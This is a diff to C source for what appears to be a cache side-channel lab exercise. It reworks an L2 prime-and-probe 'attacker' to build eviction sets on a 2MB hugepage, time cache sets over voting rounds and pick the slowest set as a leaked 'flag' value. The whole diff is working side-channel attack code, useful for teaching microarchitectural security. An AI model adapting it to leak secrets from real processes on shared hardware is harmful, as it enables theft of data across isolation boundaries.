@@ -5,23 +5,44 @@
 #include <sys/mman.h>
 #include <unistd.h>
 
-#define PAGE_SIZE (2 * 1024 * 1024) // 2MB Hugepage
-#define L2_CACHE_SETS 2048          // Number of L2 cache sets
-#define SAMPLE_RUNS 30              // Number of samples per set
-#define ADDRESSES_PER_SET 8         // Addresses to probe per set
-#define ROUNDS 20                   // Number of rounds for stable voting
+#define PAGE_SIZE (2 * 1024 * 1024)  // 2MB Hugepage
+#define L2_CACHE_SETS 2048           // Skylake L2 cache sets
+#define CACHE_LINE_SIZE 64
+#define MAX_EVSET_SIZE 32            // Eviction set size (max 32 addresses)
+#define SAMPLE_RUNS 30               // Samples per measurement
+#define ROUNDS 30                    // Number of voting rounds
 
-// Probe a cache set and get average access time
-uint64_t probe_set(volatile uint8_t *buf, int set_index) {
-    uint64_t total_time = 0;
+// Get L2 cache set index from an address
+int get_set_index(uint64_t addr) {
+    return (addr >> 6) & 0x7FF; // 11 bits for 2048 sets
+}
 
-    for (int i = 0; i < SAMPLE_RUNS; i++) {
-        for (int j = 0; j < ADDRESSES_PER_SET; j++) {
-            volatile uint8_t *addr = buf + (set_index * 64) + (j * 4096);
-            total_time += measure_one_block_access_time((uint64_t)addr);
+// Build an eviction set for a given cache set
+void build_eviction_set(volatile uint8_t *buf, int target_set, volatile uint8_t **evset, int *evset_size) {
+    *evset_size = 0;
+    uint64_t base_addr = (uint64_t) buf;
+
+    for (int offset = 0; offset < PAGE_SIZE; offset += CACHE_LINE_SIZE) {
+        uint64_t addr = base_addr + offset;
+        if (get_set_index(addr) == target_set) {
+            evset[*evset_size] = (volatile uint8_t *) addr;
+            (*evset_size)++;
+            if (*evset_size >= MAX_EVSET_SIZE) {
+                break;
+            }
         }
     }
-    return total_time / (SAMPLE_RUNS * ADDRESSES_PER_SET);
+}
+
+// Measure average access time for an eviction set
+uint64_t probe_eviction_set(volatile uint8_t **evset, int evset_size) {
+    uint64_t total_time = 0;
+    for (int sample = 0; sample < SAMPLE_RUNS; sample++) {
+        for (int i = 0; i < evset_size; i++) {
+            total_time += measure_one_block_access_time((uint64_t) evset[i]);
+        }
+    }
+    return total_time / (SAMPLE_RUNS * evset_size);
 }
 
 int main(int argc, char const *argv[]) {
@@ -35,20 +56,35 @@ int main(int argc, char const *argv[]) {
         exit(1);
     }
 
-    buf[0] = 1; // dummy write
+    buf[0] = 1; // Dummy write to ensure allocation
 
-    printf("Attacker started. Monitoring cache sets...\n");
+    printf("Attacker started. Building eviction sets...\n");
+
+    // Build eviction sets for all cache sets
+    volatile uint8_t *eviction_sets[L2_CACHE_SETS][MAX_EVSET_SIZE];
+    int evset_sizes[L2_CACHE_SETS];
+
+    for (int set = 0; set < L2_CACHE_SETS; set++) {
+        build_eviction_set(buf, set, eviction_sets[set], &evset_sizes[set]);
+    }
+
+    printf("Eviction sets built. Monitoring cache sets...\n");
 
     int votes[L2_CACHE_SETS] = {0};
 
-    // Multiple rounds
+    // Voting rounds
     for (int round = 0; round < ROUNDS; round++) {
         uint64_t timings[L2_CACHE_SETS];
 
         for (int set = 0; set < L2_CACHE_SETS; set++) {
-            timings[set] = probe_set(buf, set);
+            if (evset_sizes[set] > 0) {
+                timings[set] = probe_eviction_set(eviction_sets[set], evset_sizes[set]);
+            } else {
+                timings[set] = 0xFFFFFFFFFFFFFFFF; // If no addresses, artificially large
+            }
         }
 
+        // Find the set with max timing
         uint64_t max_time = 0;
         int candidate_flag = -1;
 
@@ -63,7 +99,7 @@ int main(int argc, char const *argv[]) {
             votes[candidate_flag]++;
         }
 
-        usleep(500); // short pause
+        usleep(500); // Small sleep
     }
 
     // Find the set with the most votes
